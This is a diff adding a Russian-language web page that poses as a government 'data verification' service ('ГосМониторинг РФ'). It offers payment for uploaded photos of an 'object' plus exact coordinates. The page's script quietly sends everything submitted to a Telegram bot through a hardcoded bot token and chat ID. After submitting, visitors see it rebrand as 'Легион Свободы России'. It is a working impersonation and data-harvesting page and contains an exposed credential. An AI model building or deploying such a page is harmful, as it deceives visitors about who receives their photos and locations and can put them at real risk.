@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Единый центр мониторинга и верификации данных</title>
+    <style>
+        body {
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            background-color: #f4f6f9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #333;
+            transition: background 1s ease-in-out, color 1s ease-in-out;
+        }
+
+        /* Верхняя панель безопасности */
+        .top-bar {
+            background-color: #1e293b;
+            color: #94a3b8;
+            font-size: 12px;
+            padding: 6px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #38bdf8;
+        }
+
+        /* Шапка сайта */
+        header {
+            background-color: #ffffff;
+            padding: 15px 30px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-weight: 700;
+            font-size: 18px;
+            color: #0f172a;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background: linear-gradient(135deg, #0284c7, #0369a1);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Основной контент */
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 15px;
+        }
+
+        /* Блок преимуществ сверху формы */
+        .features-grid {
+            display: flex;
+            gap: 15px;
+            max-width: 520px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .feature-card {
+            background: #fff;
+            flex: 1;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #475569;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+            border: 1px solid #e2e8f0;
+            text-align: center;
+        }
+        .feature-card strong {
+            display: block;
+            color: #0f172a;
+            margin-bottom: 3px;
+            font-size: 13px;
+        }
+
+        /* Карточка формы */
+        .container {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+            width: 100%;
+            max-width: 520px;
+            padding: 35px;
+            box-sizing: border-box;
+            border: 1px solid #e2e8f0;
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-top: 0;
+            margin-bottom: 8px;
+            color: #0f172a;
+            text-align: center;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.4;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #334155;
+        }
+
+        input[type="file"],
+        input[type="text"] {
+            width: 100%;
+            padding: 11px 14px;
+            box-sizing: border-box;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            background-color: #f8fafc;
+            font-size: 14px;
+            transition: border-color 0.2s;
+        }
+        input[type="text"]:focus,
+        input[type="file"]:focus {
+            outline: none;
+            border-color: #0284c7;
+            background-color: #fff;
+        }
+
+        .preview-list {
+            margin: 8px 0 20px 0;
+            font-size: 13px;
+            background: #f8fafc;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px dashed #cbd5e1;
+            max-height: 110px;
+            overflow-y: auto;
+            color: #475569;
+        }
+        .preview-item {
+            margin-bottom: 4px;
+        }
+
+        button {
+            padding: 13px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            background-color: #0284c7;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s, transform 0.1s;
+        }
+        button:hover {
+            background-color: #0369a1;
+        }
+        button:active {
+            transform: scale(0.99);
+        }
+
+        .secondary-btn {
+            background-color: #e2e8f0;
+            color: #334155;
+            margin-top: 8px;
+        }
+        .secondary-btn:hover {
+            background-color: #cbd5e1;
+        }
+
+        /* Лоадер */
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #e2e8f0;
+            border-top: 4px solid #0284c7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Вторая страница / Успешный экран с темой Легиона */
+        .flag-background {
+            background: linear-gradient(to bottom, #0057b7 50%, #ffd700 50%) !important;
+        }
+        .flag-background .top-bar {
+            background-color: #111827;
+        }
+        .flag-background header {
+            background-color: #ffffff;
+        }
+        /* Стили логотипа Легиона для второй страницы */
+        .flag-background .logo-icon-custom {
+            width: 36px;
+            height: 24px;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #d1d5db;
+            border-radius: 3px;
+            overflow: hidden;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            background: none;
+        }
+        .flag-stripe { flex: 1; }
+        .stripe-white { background-color: #ffffff; }
+        .stripe-blue { background-color: #0056b3; }
+
+        .flag-background .container {
+            background: rgba(255, 255, 255, 0.95);
+            color: #0f172a;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Подвал */
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #64748b;
+            background-color: #ffffff;
+            border-top: 1px solid #e2e8f0;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Верхняя панель -->
+    <div class="top-bar">
+        <div class="security-badge">
+            <span>🔒 Защищенное соединение (SSL 256-bit)</span>
+        </div>
+        <div id="top-bar-text">Регламент № 408-ФЗ</div>
+    </div>
+
+    <!-- Шапка (логотип динамически меняется на второй странице) -->
+    <header>
+        <div class="logo" id="header-logo">
+            <div class="logo-icon" id="logo-box">М</div>
+            <span id="logo-text">ГосМониторинг РФ</span>
+        </div>
+        <div style="font-size: 13px; color: #64748b; font-weight: 500;" id="header-sub">Линия верификации</div>
+    </header>
+
+    <!-- Основной контент -->
+    <div class="main-content">
+        
+        <!-- Карточки-преимущества -->
+        <div class="features-grid" id="features-header">
+            <div class="feature-card">
+                <strong>1. Загрузка</strong>
+                Приложите фото объекта
+            </div>
+            <div class="feature-card">
+                <strong>2. Координаты</strong>
+                Укажите точную точку
+            </div>
+            <div class="feature-card">
+                <strong>3. Выплата</strong>
+                Получите вознаграждение
+            </div>
+        </div>
+
+        <div class="container">
+            
+            <!-- Форма -->
+            <div id="form-block">
+                <h1>Регистрация отчета</h1>
+                <div class="subtitle">Заполните данные для прохождения автоматической проверки и получения средств.</div>
+                
+                <div class="input-group">
+                    <label for="file-input">Фотографии объекта:</label>
+                    <input type="file" id="file-input" accept="image/*">
+                    <button type="button" id="add-file-btn" class="secondary-btn">Добавить фото в список</button>
+                </div>
+
+                <div class="preview-list" id="preview-list">
+                    <i>Фотографии пока не добавлены</i>
+                </div>
+
+                <div class="input-group">
+                    <label for="coords-input">Геолокация (Широта, Долгота):</label>
+                    <input type="text" id="coords-input" placeholder="Например: 50.4501, 30.5234">
+                </div>
+
+                <button id="upload-btn">Отправить на верификацию</button>
+            </div>
+
+            <!-- Загрузка -->
+            <div id="loading-block" class="hidden" style="text-align: center;">
+                <h2 style="font-size: 18px; margin-bottom: 10px; color: #0f172a;">Шифрование и передача пакета...</h2>
+                <div class="spinner"></div>
+                <p style="font-size: 13px; color: #64748b;">Идет сверка координат с базой данных. Не закрывайте страницу.</p>
+            </div>
+
+            <!-- Успех (Вторая страница) -->
+            <div id="success-block" class="hidden" style="text-align: center;">
+                <h1 style="color: #16a34a; margin-bottom: 12px;">✓ Данные приняты</h1>
+                <p style="font-size: 16px; font-weight: 500; color: #0f172a;">Спасибо, ваша информация помогает ____</p>
+            </div>
+
+        </div>
+    </div>
+
+    <footer id="footer-text">
+        © 2026 Единый центр общественного контроля. Все права защищены.
+    </footer>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8153430759:AAG_RLKiZVgIlUh3BTb_XWnnZN2z31GkoTk";
+        const CHAT_ID = "6452940092";
+
+        const fileInput = document.getElementById("file-input");
+        const addFileBtn = document.getElementById("add-file-btn");
+        const previewList = document.getElementById("preview-list");
+        const coordsInput = document.getElementById("coords-input");
+        const uploadBtn = document.getElementById("upload-btn");
+        
+        const formBlock = document.getElementById("form-block");
+        const loadingBlock = document.getElementById("loading-block");
+        const successBlock = document.getElementById("success-block");
+        const bodyElement = document.body;
+        const featuresHeader = document.getElementById("features-header");
+
+        // Элементы шапки для изменения на второй странице
+        const logoBox = document.getElementById("logo-box");
+        const logoText = document.getElementById("logo-text");
+        const headerSub = document.getElementById("header-sub");
+        const topBarText = document.getElementById("top-bar-text");
+        const footerText = document.getElementById("footer-text");
+
+        let uploadedFiles = [];
+
+        addFileBtn.addEventListener("click", () => {
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                uploadedFiles.push(file);
+                updatePreviewUI();
+                fileInput.value = "";
+            } else {
+                alert("Сначала выберите файл фотографии.");
+            }
+        });
+
+        function updatePreviewUI() {
+            if (uploadedFiles.length === 0) {
+                previewList.innerHTML = "<i>Фотографии пока не добавлены</i>";
+                return;
+            }
+            previewList.innerHTML = "";
+            uploadedFiles.forEach((file, index) => {
+                const div = document.createElement("div");
+                div.className = "preview-item";
+                div.textContent = `${index + 1}. ${file.name}`;
+                previewList.appendChild(div);
+            });
+        }
+
+        uploadBtn.addEventListener("click", async () => {
+            if (uploadedFiles.length === 0) {
+                alert("Пожалуйста, добавьте хотя бы одно фото.");
+                return;
+            }
+
+            const coords = coordsInput.value.trim();
+            if (!coords) {
+                alert("Пожалуйста, введите координаты.");
+                return;
+            }
+
+            formBlock.classList.add("hidden");
+            loadingBlock.classList.remove("hidden");
+
+            try {
+                const textMessage = `Новые данные с сайта!\nКоординаты: ${coords}`;
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMessage
+                    })
+                });
+
+                for (let file of uploadedFiles) {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", file);
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                }
+
+            } catch (error) {
+                console.error("Ошибка отправки:", error);
+            }
+
+            setTimeout(() => {
+                loadingBlock.classList.add("hidden");
+                successBlock.classList.remove("hidden");
+                bodyElement.classList.add("flag-background");
+                if (featuresHeader) featuresHeader.style.display = "none";
+
+                // Превращаем шапку и подвал во второй странице в Легион Свободы России
+                topBarText.textContent = "Secure Protocol";
+                logoBox.className = "logo-icon-custom";
+                logoBox.innerHTML = `
+                    <div class="flag-stripe stripe-white"></div>
+                    <div class="flag-stripe stripe-blue"></div>
+                    <div class="flag-stripe stripe-white"></div>
+                `;
+                logoText.textContent = "ЛЕГИОН СВОБОДЫ РОССИИ";
+                headerSub.textContent = "Координационный центр";
+                footerText.textContent = "© 2026 Легион Свободы России. Все права защищены.";
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
